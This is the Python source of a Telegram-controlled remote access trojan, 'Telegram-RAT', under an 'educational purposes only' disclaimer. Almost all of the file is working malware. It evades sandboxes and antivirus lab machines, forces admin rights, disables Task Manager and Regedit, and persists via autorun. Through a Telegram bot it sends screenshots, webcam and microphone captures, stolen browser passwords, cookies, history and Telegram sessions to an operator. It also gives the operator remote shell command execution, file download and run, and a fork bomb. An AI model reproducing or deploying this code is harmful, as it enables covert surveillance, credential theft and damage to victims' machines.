"""

^ Author    : Bainky
^ Name      : Telegram-RAT
^ Github    : https:github.com/Bainky
^ Telegram  : t.me/bainki

> This program is distributed for educational purposes only.
> Any unauthorized use of this tool without explicit permission is illegal ;)

"""

import re
import os
import sys
import time
import shutil
import telebot
import requests
import subprocess
import urllib.request
from subprocess import Popen, PIPE

from RAT import *

from Core.Settings.Organization    import *
from Core.Settings.Antivirus       import *
from Core.Settings.Emulator        import *
from Core.Settings.Debugger        import *
from Core.Settings.SandBox         import *
from Core.Settings.VirtualBox      import *
from Core.Settings.Admin           import *
from Core.Settings.CriticalProcess import *
from Core.Settings.MessageBox      import *

from Core.Main.Information         import *
from Core.Main.Screen              import *
from Core.Main.Webcam              import *
from Core.Main.Audio               import *
from Core.Main.Power               import *
from Core.Main.Autorun             import *

from Core.Files.Tasklist           import *
from Core.Files.Taskkill           import *

from Core.Fun.Message              import *
from Core.Fun.Speak                import *
from Core.Fun.OpenURL              import *
from Core.Fun.Wallpapers           import *
from Core.Fun.ForkBomb             import *

from Core.Stealer.Stealer          import *
from Core.Stealer.Telegram         import *

from Core.Misc.Clipboard           import *
from Core.Misc.Monitor             import *
from Core.Misc.Rotate              import *
from Core.Misc.Freeze              import *

from telebot import types
from telebot import util
from telebot import apihelper

bot = telebot.TeleBot(TelegramToken, threaded=True)
bot.worker_pool = util.ThreadPool(num_threads=50)

menu = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/1\n<<')
button2 = types.KeyboardButton('/2\n>>')
button3 = types.KeyboardButton('/Screen\n🖼')
button4 = types.KeyboardButton('/Webcam\n📸')
button5 = types.KeyboardButton('/Video\n🎥')
button6 = types.KeyboardButton('/Audio\n🎙')
button7 = types.KeyboardButton('/Power\n🔴')
button8 = types.KeyboardButton('/Autorun\n🔵')
menu.row(button1, button3, button2)
menu.row(button4, button5, button6)
menu.row(button7, button8)

main2 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Hibernate - 🛑', callback_data='hibernate')
button2 = types.InlineKeyboardButton('Shutdown - ⛔️', callback_data='shutdown')
button3 = types.InlineKeyboardButton('Restart - ⭕️', callback_data='restart')
button4 = types.InlineKeyboardButton('Logoff - 💢', callback_data='logoff')
button5 = types.InlineKeyboardButton('BSoD - 🌀', callback_data='bsod')
button6 = types.InlineKeyboardButton('« Back', callback_data='cancel')
main2.row(button1)
main2.row(button2)
main2.row(button3)
main2.row(button4)
main2.row(button5)
main2.row(button6)

main3 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Add to Startup - 📥', callback_data='startup')
button2 = types.InlineKeyboardButton('Uninstall - ♻️', callback_data='confirm')
button3 = types.InlineKeyboardButton('« Back', callback_data='cancel')
main3.row(button1)
main3.row(button2)
main3.row(button3)

main4 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Yes, im sure!', callback_data='uninstall')
button2 = types.InlineKeyboardButton('Hell no!', callback_data='cancel')
button3 = types.InlineKeyboardButton('« Back', callback_data='cancel')
main4.row(button1)
main4.row(button2)
main4.row(button3)

main5 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/3\n<<')
button2 = types.KeyboardButton('/Screen\n🖼')
button3 = types.KeyboardButton('/4\n>>')
button4 = types.KeyboardButton('/Files\n💾')
button5 = types.KeyboardButton('/Tasklist\n📋')
button6 = types.KeyboardButton('/Taskkill\n📝')
main5.row(button1, button2, button3)
main5.row(button4)
main5.row(button5, button6)

main6 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Kill all Processes', callback_data='taskkill all')
button2 = types.InlineKeyboardButton('Disable Task Manager', callback_data='disabletaskmgr')
main6.row(button1)
main6.row(button2)

main7 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/CD\n🗂')
button2 = types.KeyboardButton('/Upload\n📡')
button3 = types.KeyboardButton('/ls\n📄')
button4 = types.KeyboardButton('/Remove\n🗑')
button5 = types.KeyboardButton('/Download\n📨')
button6 = types.KeyboardButton('/Run\n📌')
button7 = types.KeyboardButton('/Cancel')
main7.row(button1, button2, button3)
main7.row(button4, button5, button6)
main7.row(button7)

main8 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/5\n<<')
button2 = types.KeyboardButton('/Screen\n🖼')
button3 = types.KeyboardButton('/6\n>>')
button4 = types.KeyboardButton('/Message\n💬')
button5 = types.KeyboardButton('/Speak\n📢')
button6 = types.KeyboardButton('/OpenURL\n🌐')
button7 = types.KeyboardButton('/Wallpapers\n🧩')
button8 = types.KeyboardButton('/ForkBomb\n⏱')
main8.row(button1, button2, button3)
main8.row(button4, button5)
main8.row(button6, button7, button8)


# Variables

Expansion = os.path.splitext(os.path.basename(sys.argv[0]))[1]
CurrentName = os.path.basename(sys.argv[0])
CurrentPath = sys.argv[0]
ProcessName = ProcessName + Expansion



# Create a folder to save temporary files

if os.path.exists(Directory):
  pass
else:
 os.makedirs(Directory)
 os.makedirs(Directory + 'Documents')
 os.makedirs(Directory + 'Photos')



# Checks if the script is running on VirtualBox or
# on the computer of the anti-virus organization

if PreventStartOnSandBoxie is True:
 if SandBox() is True:
  sys.exit()

if PreventStartOnVirtualMachine is True:
 if VirtualBox() is True:
  sys.exit()

if PreventStartOnMalwareOrganization is True:
 if Organization() or OrganizationPaths() is True:
  sys.exit()


# Proxy Setting

if Proxy is True:
 apihelper.proxy = {'https': 'socks5://{}:{}'.format(Ip, Port)}

if xProxy is True:
 apihelper.proxy = {'https': 'socks5://{}:{}@{}:{}'.format(xLogin, xPassword, xIp, xPort)}


# Run as Administrator

if AdminRightsRequired is True:
 if Admin() is False:
  while True:
   try:
    os.startfile(CurrentPath, 'runas')
   except:
    pass
   else:
    print('[+] › ' + CurrentName + ' Opened as Administrator!\n')
    break


# Checks if the file is running as an administrator

if AdminRightsRequired is True:
 if Admin() is False:
  sys.exit()


# Disables TaskManager

if DisableTaskManager is True:
 try:
  if os.path.exists(Directory + 'RegeditDisableTaskManager'):
   print('[+] › Task Manager is Already Disabled!\n')

  else:
   if Admin() is False:
    print('[-] › This Function Requires Admin Rights!\n')
   
   if Admin() is True:
    RegeditDisableTaskManager()
    open(Directory + 'RegeditDisableTaskManager', 'a').close()
    print('[+] › Task Manager Disabled!\n')
 except:
  pass


# Disables Regedit

if DisableRegistryTools is True:
 try:
  if os.path.exists(Directory + 'RegeditDisableRegistryTools'):
   print('[+] › Regedit is Already Disabled!\n')

  else:
   if Admin() is False:
    print('[-] › This Function Requires Admin Rights!\n')

   if Admin() is True:
    RegeditDisableRegistryTools()
    open(Directory + 'RegeditDisableRegistryTools', 'a').close()
    print('[+] › Regedit Disabled!\n')
 except:
  pass


# Adds a program to startup

if AutorunEnabled is True:
 try:
  if Exists(AutorunName) is True:
   print('[+] › '+CurrentName+' ‹ is Already in Startup › ' + InstallPath + '\\' + ProcessName + '\n')

  else:
   if Admin() is False:
    print('[-] › This Function Requires Admin Rights!\n')

   if Admin() is True:
    AddToAutorun(AutorunName, InstallPath, ProcessName)
    CopyToAutorun(CurrentPath, InstallPath, ProcessName)
    print('[+] › ' + CurrentName+' ‹ Copied to Startup › ' + InstallPath + '\\' + ProcessName + '\n')
 except:
  pass


# Displays a message on the screen.

if DisplayMessageBox is True:
 try: 
  if os.path.exists(Directory + 'DisplayMessageBox'):
   pass

  else:
   open(Directory + 'DisplayMessageBox', 'a').close()
   MessageBox(MessageTitle, Message)
 except:
  pass


# Protect process with BSoD (if killed).

if ProcessBSODProtectionEnabled is True:
 if Admin() is False:
  print('[-] › This Function Requires Admin Rights!\n')

 if Admin() is True:
  SetProtection()
  print('[+] › Process Protection Activated!\n')


if ProcessBSODProtectionEnabled is True:
 Argument = none_stop = True
else:
 Argument = ''


# Sends an online message

while True:
 try:
  if Admin() is True:
   Online = '🔘 Online!'

  if Admin() is False:
   Online = '🟢 Online!'

  bot.send_message(TelegramChatID, 
  '\n*' + Online + '\n'
  '\nPC » ' + os.getlogin() +
  '\nOS » ' + Windows() +
  '\n'
  '\nAV » ' + av +
  '\n'
  '\nIP » ' + Location('query') + '*',
  parse_mode='Markdown', reply_markup=menu)

 except Exception as e:
  print('[-] › No Connection!\n')
  print(e)
 else:
  print('[+] › Connected!\n')
  break


# Takes a screenshot

@bot.message_handler(regexp='/Screen')
def Screen(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_photo')
  File = Directory + 'Screenshot.jpg'

  TakeScreenshot(File)
  Screen = open(File, 'rb')

  bot.send_photo(command.chat.id, Screen)
 except:
  pass


# Takes a photo from a webcam

@bot.message_handler(regexp='/Webcam')
def Webcam(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_photo')
  File = Directory + 'Webcam.jpg'

  TakeWebcamPhoto(File)
  Webcam = open(File, 'rb')

  bot.send_photo(command.chat.id, Webcam)
 except:
  bot.send_message(command.chat.id, '*Webcam Not Found!*', parse_mode='Markdown')


# Takes a video from a webcam

@bot.message_handler(regexp='/Video')
def Video(command):
 try:
  Seconds = re.split('/Video ', command.text, flags=re.I)[1]
  bot.send_message(command.chat.id, '*Recording...*', parse_mode='Markdown')
  try:
   File = Directory + 'Video.mp4'

   VideoRecorder(Seconds, File)
   Video = open(File, 'rb')

   bot.send_animation(command.chat.id, Video)
  except ValueError:
   bot.send_message(command.chat.id, '*Value Error*', parse_mode='Markdown')
  except:
   bot.send_message(command.chat.id, '*Webcam Not Found!*', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, '*Specify the Recording Duration\n\n› /Video*', parse_mode='Markdown')


# Records microphone sound

@bot.message_handler(regexp='/Audio')
def Audio(command):
 try:
  Seconds = re.split('/Audio ', command.text, flags=re.I)[1]
  bot.send_message(command.chat.id, '*Recording...*', parse_mode='Markdown')
  try:
   File = Directory + 'Audio.wav'
   
   AudioRecorder(Seconds, File)
   Audio = open(File, 'rb')
   
   bot.send_voice(command.chat.id, Audio)
  except ValueError:
   bot.send_message(command.chat.id, '*Value Error*', parse_mode='Markdown')
  except:
   bot.send_message(command.chat.id, '*Failed to Record Audio!*', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, '*Specify the Recording Duration\n\n› /Audio*', parse_mode='Markdown')


# Sends a message

def SendMessage(call, text):
 bot.edit_message_text(chat_id=call.message.chat.id,
 message_id=call.message.message_id, text=text, parse_mode='Markdown')


# Power and startup management

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(command):
 if command.message:


  # Hibernate button

  if command.data == 'hibernate':
   try:
    SendMessage(command, '*Hibernate* Command Received!')
    UnsetProtection()
    Hibernate()
   except:
    pass


  # Shutdown button

  if command.data == 'shutdown':
   try:
    SendMessage(command, '*Shutdown* Command Received!')
    UnsetProtection()
    Shutdown()
   except:
    pass


  # Reboot button

  if command.data == 'restart':
   try:
    SendMessage(command, '*Restart* Command Received!')
    UnsetProtection()
    Restart()
   except:
    pass


  # Button that ends a user session

  if command.data == 'logoff':
   try:
    SendMessage(command, '*Logoff* Command Received!')
    UnsetProtection()
    Logoff()
   except:
    pass


  # Button killing system with blue screen of death

  if command.data == 'bsod':
   try:
    SendMessage(command, 'The *Blue Screen of Death* is activated!')
    UnsetProtection()
    BSoD()
   except:
    pass


  # Button processing which adds a trojan to startup (schtasks)

  if command.data == 'startup':
   try:
    if Exists(AutorunName) is True:
     SendMessage(command, '*' + ProcessName + '* is already in startup!')

    else:
     if Admin() is False:
      SendMessage(command, '*This Function Requires Admin Rights!*')
     
     if Admin() is True:
      AddToAutorun(AutorunName, InstallPath, ProcessName)
      CopyToAutorun(CurrentPath, InstallPath, ProcessName)
      SendMessage(command, '*' + ProcessName + '* copied to startup!')
   except:
    SendMessage(command, '*Error*')


  # Button processing that confirms the removal of a trojan

  if command.data == 'confirm':
   bot.edit_message_text(chat_id=command.message.chat.id,
   message_id=command.message.message_id, text='*Are You Sure?*', reply_markup=main4, parse_mode='Markdown')


  # Handling the <<Uninstall>> Button

  if command.data == 'uninstall':
   try:
    SendMessage(command, '*' + CurrentName + '* uninstalled!')
    Uninstall(AutorunName, InstallPath, ProcessName, CurrentName, CurrentPath, Directory)
   except:
    SendMessage(command, '*Error*')


  # Handling the <<Kill All Processes>> Button

  if command.data == 'taskkill all':
   try:
    TaskkillAll(CurrentName)
    SendMessage(command, '*All Processes are Stopped!*')
   except:
    pass


  # Handling the <<Disable Task Manager>> Button

  if command.data == 'disabletaskmgr':
   try:
    if os.path.exists(Directory + 'RegeditDisableTaskManager'):
      SendMessage(command, '*Task Manager* is already disabled!')

    else:
     if Admin() is False:
      SendMessage(command, '*This Function Requires Admin Rights!*')

     if Admin() is True:
      RegeditDisableTaskManager()
      open(Directory + 'RegeditDisableTaskManager', 'a').close()
      SendMessage(command, '*Task Manager* disabled!')
   except:
    pass


  # Handling the <<Back>> Button

  if command.data == 'cancel':
    SendMessage(command, '`...`')


# Browse and switch directories

@bot.message_handler(regexp='/CD')
def CD(command):
 try:
  Path = re.split('/CD ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')

  os.chdir(Path)

  bot.send_message(command.chat.id, '*Directory Changed!*\n\n`' + os.getcwd() + '`', parse_mode='Markdown')
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*Directory Not Found!*', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, '*Current Directory*\n\n`' + os.getcwd() + '`\n\n*Username*\n\n`' + os.getlogin() + '`', parse_mode='Markdown')


# List of files from a directory

@bot.message_handler(regexp='/ls')
def ls(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')

  dirs = '\n``'.join(os.listdir())

  bot.send_message(command.chat.id, '`' + os.getcwd() + '`\n\n' + '`' + dirs + '`', parse_mode='Markdown')
 except:
  try:
   dirse = '\n'.join(os.listdir())
   
   splitted_text = util.split_string(dirse, 4096)
   for dirse in splitted_text:
   
     bot.send_message(command.chat.id, '`' + dirse + '`', parse_mode='Markdown')
  except PermissionError:
   bot.send_message(command.chat.id, '*Permission Denied!*', parse_mode='Markdown')
  except:
   pass


# Deletes a user selected file

@bot.message_handler(commands=['Remove', 'remove'])
def Remove(command):
 try:
  File = re.split('/Remove ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')

  created = os.path.getctime(os.getcwd() + '\\' + File)
  year,month,day,hour,minute,second=time.localtime(created)[:-3]

  def convert_bytes(num):
      for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
          if num < 1024.0:
              return '%3.1f %s' % (num, x)
          num /= 1024.0

  def file_size(file_path):
      if os.path.isfile(file_path):
          file_info = os.stat(file_path)
          return convert_bytes(file_info.st_size)

  bot.send_message(command.chat.id, 
   'File *' + File + '* removed!' 
   '\n' 
   '\nCreated » %02d/%02d/%d'%(day,month,year) +
   '\nSize » ' + file_size(os.getcwd() + '\\' + File),
   parse_mode='Markdown')

  os.remove(os.getcwd() + '\\' + File)

 except:
  try:
   created = os.path.getctime(os.getcwd() + '\\' + File)
   year,month,day,hour,minute,second=time.localtime(created)[:-3]

   folder = os.getcwd() + '\\' + File
   folder_size = 0
   for (path, dirs, files) in os.walk(folder):
     for file in files:
       filename = os.path.join(path, file)
       folder_size += os.path.getsize(filename)
   files = folders = 0
   for _, dirnames, filenames in os.walk(os.getcwd() + '\\' + File):
       files += len(filenames)
       folders += len(dirnames)

   shutil.rmtree(os.getcwd() + '\\' + File)

   bot.send_message(command.chat.id, 
    'Folder *'+File+'* removed!'
    '\n'
    '\nCreated » %02d/%02d/%d'%(day,month,year) +
    '\nSize » %0.1f MB' % (folder_size/(1024*1024.0)) +
    '\nContained » ' + '{:,} Files, {:,} Folders'.format(files, folders),
    parse_mode='Markdown')

  except FileNotFoundError:
   bot.send_message(command.chat.id, '*File Not Found!*', parse_mode='Markdown')
  except PermissionError:
   bot.send_message(command.chat.id, '*Permission denied!*', parse_mode='Markdown')
  except:
   bot.send_message(command.chat.id, '*Enter a File Name\n\n› /Remove • /RemoveAll*', parse_mode='Markdown')


# Deletes all files from the directory

@bot.message_handler(commands=['RemoveAll', 'removeall'])
def RemoveAll(command):
 try:
  bot.send_message(command.chat.id, '*Removing files...*', parse_mode='Markdown')

  folder_size = 0
  for (path, dirs, files) in os.walk(os.getcwd()):
    for file in files:
      filename = os.path.join(path, file)
      folder_size += os.path.getsize(filename)
  files = folders = 0

  for _, dirnames, filenames in os.walk(os.getcwd()):
      files += len(filenames)
      folders += len(dirnames)
  list = os.listdir(os.getcwd())
  a = len(list)
  for filename in os.listdir(os.getcwd()):
      file_path = os.path.join(os.getcwd(), filename)
      try:
          if os.path.isfile(file_path) or os.path.islink(file_path):
              os.unlink(file_path)
          elif os.path.isdir(file_path):
              shutil.rmtree(file_path)
      except:
        pass

  list = os.listdir(os.getcwd())
  b = len(list)
  c = (a - b +2)

  bot.send_message(command.chat.id,
   'Removed *' + str(c) + '* files out of *' + str(a) + '*!'
   '\n'
   '\nSize » %0.1f MB' % (folder_size/(1024*1024.0)) +
   '\nContained » ' + '{:,} Files, {:,} Folders'.format(files, folders),
   parse_mode='Markdown')
 except:
  pass


# Upload a file to a connected computer (URL)

@bot.message_handler(regexp='/Upload')
def Upload(command):
 try:
  url = re.split('/Upload ', command.text, flags=re.I)[1]
  bot.send_message(command.chat.id, '*Uploading File...*', parse_mode='Markdown')

  r = requests.get(url, allow_redirects=True)
  file = os.getcwd() + '\\' + os.path.basename(r.url)
  open(file, 'wb').write(r.content)

  bot.reply_to(command, '*File Uploaded to Computer!*\n\n`' + file + '`', parse_mode='Markdown')
 except ValueError:
  bot.reply_to(command, '*Value Error*', parse_mode='Markdown')
 except Exception as e:
  bot.send_message(command.chat.id, '*Send File or Paste URL\n\n› /Upload*', parse_mode='Markdown')


# Download a file to a connected computer (Message)

@bot.message_handler(content_types=['document'])
def Document(command):
 try:
  File = bot.get_file(command.document.file_id)
  bot.send_message(command.chat.id, '*Uploading file...*', parse_mode='Markdown')

  downloaded_file = bot.download_file(File.file_path)
  src = Directory + File.file_path;
  with open(src, 'wb') as new_file:
   new_file.write(downloaded_file)
  
  final = os.getcwd() + '\\' + src.split(File.file_path)[1] + command.document.file_name
  shutil.move(src, final)

  bot.reply_to(command, '*File Uploaded to Computer!*\n\n`' + final + '`', parse_mode='Markdown')
 except FileNotFoundError:
  bot.reply_to(command, '*File Format is Not Supported!*', parse_mode='Markdown')
 except:
  bot.reply_to(command, '*You Cannot Upload a File Larger Than 20 MB*', parse_mode='Markdown')


# Download the file selected by the user

@bot.message_handler(regexp='/Download')
def Download(command):
 try:
  File = re.split('/Download ', command.text, flags=re.I)[1]
  
  download = open(os.getcwd() + '\\' + File, 'rb')

  bot.send_message(command.chat.id, '*Sending file...*', parse_mode='Markdown')
  bot.send_document(command.chat.id, download)
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*File Not Found!*', parse_mode='Markdown')

 except:
  try:
   File = re.split('/Download ', command.text, flags=re.I)[1]
   bot.send_message(command.chat.id, '*Archiving...*', parse_mode='Markdown')

   shutil.make_archive(Directory + File,
                           'zip',
                           os.getcwd() + '\\',
                           File)
   file = open(Directory + File + '.zip', 'rb')

   bot.send_message(command.chat.id, '*Sending Folder...*', parse_mode='Markdown')
   bot.send_document(command.chat.id, file)

   file.close()
   os.remove(Directory + File + '.zip')
  except PermissionError:
   bot.send_message(command.chat.id, '*Permission Denied!*', parse_mode='Markdown')
  except:
   try:

    file.close()
    os.remove(Directory + File + '.zip')

    bot.send_message(command.chat.id, '*You Cannot Upload a File Larger Than 50 MB*', parse_mode='Markdown')
   except:
    bot.send_message(command.chat.id, '*Enter a File Name\n\n› /Download*', parse_mode='Markdown')


# Runs the file selected by the user

@bot.message_handler(commands=['Run', 'run'])
def Run(command):
 try:
  File = re.split('/Run ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')

  os.startfile(os.getcwd() + '\\' + File)

  bot.send_message(command.chat.id, 'File *' + File + '* is running!', parse_mode='Markdown')
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*File Not Found!*', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, '*Enter a File Name\n\n› /Run • /RunAS*', parse_mode='Markdown')


# Runs the file selected by the user as administrator

@bot.message_handler(commands=['RunAS', 'runas'])
def RunAS(command):
 try:
  File = re.split('/RunAS ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')

  os.startfile(os.getcwd() + '\\' + File, 'runas')

  bot.send_message(command.chat.id, 'File *' + File + '* is running!', parse_mode='Markdown')
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*File Not Found!*', parse_mode='Markdown')
 except OSError:
  bot.send_message(command.chat.id, '*Acces Denied!*', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, '*Enter a File Name\n\n› /Run • /RunAS*', parse_mode='Markdown')


# Gets a list of active processes

@bot.message_handler(regexp='/Tasklist')
def Tasklist(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')

  ProcessList()

  bot.send_message(command.chat.id, '`' + ProcessList() + '`', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, '*Failed to Get Process List!*', parse_mode='Markdown')


# Kills the user selected process

@bot.message_handler(regexp='/Taskkill')
def Taskkill(command):
 try:
  Process = re.split('/Taskkill ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')

  KillProcess(Process)

  if not Process.endswith('.exe'):
   Process = Process + '.exe'

  bot.send_message(command.chat.id, 'Process *' + Process + '* is was stopped!', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, 
   '*Enter Process Name'
   '\n'
   '\n› /Taskkill'
   '\n'
   '\nActive Window*'
   '\n'
   '\n`' + WindowTitle() + '`',
   reply_markup=main6, parse_mode='Markdown')


# Displays text sent by user

@bot.message_handler(regexp='/Message')
def Message(command):
 try:
  Message = re.split('/Message ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  bot.reply_to(command, '*The Message is Sent!*', parse_mode='Markdown')
  SendMessageBox(Message)
 except:
  bot.send_message(command.chat.id, '*Enter your Message\n\n› /Message*', parse_mode='Markdown')


# Speak text

@bot.message_handler(regexp='/Speak')
def Speak(command):
 try:
  Text = re.split('/Speak ', command.text, flags=re.I)[1]
  bot.send_message(command.chat.id, '*Speaking...*', parse_mode='Markdown')
  try:

   SpeakText(Text)
   bot.reply_to(command, '*Successfully!*', parse_mode='Markdown')

  except:
   bot.reply_to(command, '*Failed to Speak Text!*', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, '*Enter Text\n\n› /Speak*', parse_mode='Markdown')


# Opens a link from a standard browser

@bot.message_handler(regexp='/OpenURL')
def OpenURL(command):
 try:
  URL = re.split('/OpenURL ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')

  OpenBrowser(URL)

  bot.reply_to(command, '*The URL is Open!*', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, '*Enter URL\n\n› /OpenURL*', parse_mode='Markdown')


# Receive a photo from a Telegram Chat

def GetPhoto(Photo, command):
 file_info = bot.get_file(command.photo[len(command.photo)-1].file_id)
 downloaded_file = bot.download_file(file_info.file_path)
 src = Directory + file_info.file_path;
 with open(src, 'wb') as new_file:
   new_file.write(downloaded_file)


# Sets the desktop wallpaper

@bot.message_handler(content_types=['photo'])
def Wallpapers(command):
 try:
  Photo = bot.get_file(command.photo[len(command.photo)-1].file_id)
  GetPhoto(Photo, command)

  SetWallpapers(Photo, Directory)

  bot.reply_to(command, '*The Photo is Set on the Wallpapers!*', parse_mode='Markdown')
 except:
  pass


# Infinite start CMD.exe

@bot.message_handler(regexp='/Forkbomb')
def Forkbomb(command):
 bot.send_message(command.chat.id, '*Preparing ForkBomb...*', parse_mode='Markdown')
 ForkBomb()


# Gets the user current telegram session

@bot.message_handler(regexp='/Telegram')
def Telegram(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_document')

  TelegramGrab()
  Telegram = open(os.environ['TEMP']+'\\'+'tdata.zip', 'rb')

  bot.send_document(command.chat.id, Telegram)
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*Telegram Session Not Found!*', parse_mode='Markdown')
 except:
  pass


# Retrieves saved passwords from browsers (Opera, Chrome)

@bot.message_handler(regexp='/Passwords')
def Passwords(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_document')

  with open(Directory + 'Passwords.txt', 'w', encoding='utf-8') as f:
   f.writelines(GetFormattedPasswords())

  Passwords = open(Directory + 'Passwords.txt', 'rb')
  bot.send_document(command.chat.id, Passwords)
 except:
  bot.send_message(command.chat.id, '*Passwords Not Found!*', parse_mode='Markdown')


# Retrieves saved cookies from browsers (Opera, Chrome)

@bot.message_handler(regexp='/Cookies')
def Cookies(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_document')
  
  with open(Directory + 'Cookies.txt', 'w', encoding='utf-8') as f:
   f.writelines(GetFormattedCookies())
  
  Cookies = open(Directory + 'Cookies.txt', 'rb')
  bot.send_document(command.chat.id, Cookies)
 except:
  bot.send_message(command.chat.id, '*Cookies Not Found!*', parse_mode='Markdown')


# Gets saved browser history (Opera, Chrome)

@bot.message_handler(regexp='/History')
def History(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_document')
  
  with open(Directory + 'History.txt', 'w', encoding='utf-8') as f:
   f.writelines(GetFormattedHistory())
  
  History = open(Directory + 'History.txt', 'rb')
  bot.send_document(command.chat.id, History)
 except:
  bot.send_message(command.chat.id, '*History Not Found!*', parse_mode='Markdown')


# Editing and viewing the clipboard

@bot.message_handler(regexp='/Clipboard')
def Clipboard(command):
 try:
  Text = re.split('/Clipboard ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')

  SetClipboard(Text)

  bot.send_message(command.chat.id, '*Clipboard Contents Changed!*', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id,
   '*Enter Text'
   '\n'
   '\n› /Clipboard'
   '\n'
   '\nClipboard Content*'
   '\n'
   '\n`' + GetClipboard() + '`',
   parse_mode='Markdown')


# Display Rotate <0,90,180,270>

@bot.message_handler(regexp='/Rotate')
def Rotate(command):
 try:
  Position = re.split('/Rotate ', command.text, flags=re.I)[1]

  DisplayRotate(degrees=''+Position+'')

  bot.reply_to(command, '*Display Rotated!*', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id,
   '*Select Display Rotation'
   '\n'
   '\n› /Rotate'
   '\n'
   '\nProvisions*'
   '\n'
   '\n`0` / `90` / `180` / `270`',
   parse_mode='Markdown')


# Monitor <on/off>

@bot.message_handler(regexp='/Monitor')
def Monitor(command):
 try:
  Monitor = re.split('/Monitor ', command.text, flags=re.I)[1]

  if Monitor.lower() == 'Off'.lower():
   Off()
   bot.send_message(command.chat.id, '*Monitor is Off*', parse_mode='Markdown')
  
  if Monitor.lower() == 'On'.lower():
   On()
   bot.send_message(command.chat.id, '*Monitor is On*', parse_mode='Markdown')
 except:
  bot.send_message(command.chat.id, 
   '*Select Monitor Mode'
   '\n'
   '\n› /Monitor'
   '\n'
   '\nModes*'
   '\n'
   '\n`On` / `Off`',
   parse_mode='Markdown')

# Lock input (keyboard and mouse) for the selected number of seconds


@bot.message_handler(regexp='/Freeze')
def Freeze(command):
 if Admin() is False:
  bot.send_message(command.chat.id, '*This Function Requires Admin Rights!*', parse_mode='Markdown')
 
 if Admin() is True:
  try:
   Seconds = re.split('/Freeze ', command.text, flags=re.I)[1]
   bot.send_message(command.chat.id, '*Keyboard and Mouse Locked for ' + Seconds + ' Seconds!*', parse_mode='Markdown')
   
   Block(float(Seconds))
   
   bot.reply_to(command, '*Keyboard and Mouse are now Unlocked!*', parse_mode='Markdown')
  except ValueError:
   bot.reply_to(command, '*Value Error*', parse_mode='Markdown')
  except:
   bot.send_message(command.chat.id, '*Specify the Duration of the Lock\n\n› /Freeze*', parse_mode='Markdown')


# Remote command execution (CMD / BAT)

@bot.message_handler(regexp='/CMD')
def CMD(command):
 try:
  shell = re.split('/CMD ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  cmd = subprocess.Popen(shell, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
  
  lines = []
  for line in cmd.stdout.readlines():
      line = line.strip()
      if line:
          lines.append(line.decode('cp866'))
          Output = '\n'.join(lines)
  
  bot.send_message(command.chat.id, Output)
 except:
  try:
   shell = re.split('/CMD ', command.text, flags=re.I)[1]
   
   splitted_text = util.split_string(Output, 4096)
   for Output in splitted_text:

    bot.send_message(command.chat.id, Output)
  except UnboundLocalError:
   bot.reply_to(command, '*Empty Line*', parse_mode='Markdown')
  except:
   bot.send_message(command.chat.id, '*Enter Command\n\n› /CMD*', parse_mode='Markdown')


# System Information

@bot.message_handler(regexp='/Info')
def Info(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, 
   '*Script Settings*'
   '\n'
   '\n*AdminRightsRequired* » `'+str(AdminRightsRequired)+'`'+
   '\n*DisableTaskManager* » `'+str(DisableTaskManager)+'`'+
   '\n*DisableRegistryTools* » `'+str(DisableRegistryTools)+'`'+
   '\n'
   '\n*AutorunEnabled* » `'+str(AutorunEnabled)+'`'+
   '\n*InstallPath* » `'+str(InstallPath)+'`'+
   '\n*AutorunName* » `'+str(AutorunName)+'`'+
   '\n*ProcessName* » `'+str(ProcessName)+'`'+
   '\n'
   '\n*ProcessBSODProtectionEnabled* » `'+str(ProcessBSODProtectionEnabled)+'`'+
   '\n*PreventStartOnVirtualMachine* » `'+str(PreventStartOnVirtualMachine)+'`'+
   '\n*PreventStartOnMalwareOrganization* » `'+str(PreventStartOnMalwareOrganization)+'`'+
   '\n'
   '\n'
   '\n*Computer Info*'
   '\n'
   '\n*System* » `'+SystemVersion+'`'+
